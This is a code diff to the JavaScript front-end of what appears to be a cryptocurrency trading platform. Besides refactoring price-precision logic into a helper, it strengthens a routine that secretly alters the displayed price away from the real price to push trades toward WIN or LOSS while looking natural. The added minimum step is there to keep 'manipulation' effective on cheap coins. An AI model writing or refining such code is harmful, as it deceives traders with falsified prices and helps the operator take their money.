@@ -881,6 +881,13 @@
     noiseSeed: Math.random() * 1000
   };
 
+  function getPricePrecision(symbol) {
+    if (['PEPE', 'SHIB'].includes(symbol)) return 8;
+    if (['BTC', 'ETH'].includes(symbol)) return 2;
+    if (['TRX', 'DOGE', 'XRP', 'ADA', 'MATIC', 'POL'].includes(symbol)) return 5;
+    return 4;
+  }
+
   // Language switcher
   function switchLang(lang) {
     document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
@@ -948,7 +955,11 @@
       // Very small total: 0.05% = ~$33 for BTC at $67k
       // Enough to tip WIN/LOSS but looks natural
       const maxChangePercent = 0.0005;
-      const maxChange = manipulation.entryPrice * maxChangePercent;
+      const percentBasedChange = manipulation.entryPrice * maxChangePercent;
+      // For very cheap pairs (e.g. PEPE), percent-based shift can be smaller than one visible tick.
+      // Keep a tiny guaranteed minimum so manipulation remains effective across all symbols.
+      const minVisibleStep = Math.pow(10, -getPricePrecision(coinSymbol)) * 2;
+      const maxChange = Math.max(percentBasedChange, minVisibleStep);
       
       // Direction: favorable for WIN, against for LOSS
       const favorableDirection = manipulation.direction === 'up' ? 1 : -1;
@@ -1144,9 +1155,7 @@
 
   // ===== UPDATE PRICE DISPLAY =====
   function updatePriceDisplay(displayPrice, realPrice) {
-    const decimals = ['PEPE', 'SHIB'].includes(coinSymbol) ? 8 :
-                     ['BTC', 'ETH'].includes(coinSymbol) ? 2 :
-                     ['TRX', 'DOGE', 'XRP', 'ADA', 'MATIC', 'POL'].includes(coinSymbol) ? 5 : 4;
+    const decimals = getPricePrecision(coinSymbol);
     
     document.getElementById('livePrice').textContent = displayPrice.toFixed(decimals);
     document.getElementById('pairPriceDisplay').textContent = `$${displayPrice.toFixed(decimals)}`;
@@ -1210,9 +1219,7 @@
     container.innerHTML = '';
     
     // Set price precision based on coin
-    const pricePrecision = ['PEPE', 'SHIB'].includes(coinSymbol) ? 8 :
-                           ['BTC', 'ETH'].includes(coinSymbol) ? 2 :
-                           ['TRX', 'DOGE', 'XRP', 'ADA', 'MATIC', 'POL'].includes(coinSymbol) ? 5 : 4;
+    const pricePrecision = getPricePrecision(coinSymbol);
     
     // Create chart - TradingView style
     chart = LightweightCharts.createChart(container, {
@@ -1385,9 +1392,7 @@
       
       // Apply manipulation if active
       const displayPrice = manipulatePrice(realPrice);
-      const decimals = ['PEPE', 'SHIB'].includes(coinSymbol) ? 8 :
-                       ['BTC', 'ETH'].includes(coinSymbol) ? 2 :
-                       ['TRX', 'DOGE', 'XRP', 'ADA', 'MATIC', 'POL'].includes(coinSymbol) ? 5 : 4;
+      const decimals = getPricePrecision(coinSymbol);
       
       document.getElementById('livePrice').textContent = displayPrice.toFixed(decimals);
       document.getElementById('pairPriceDisplay').textContent = `$${displayPrice.toFixed(decimals)}`;
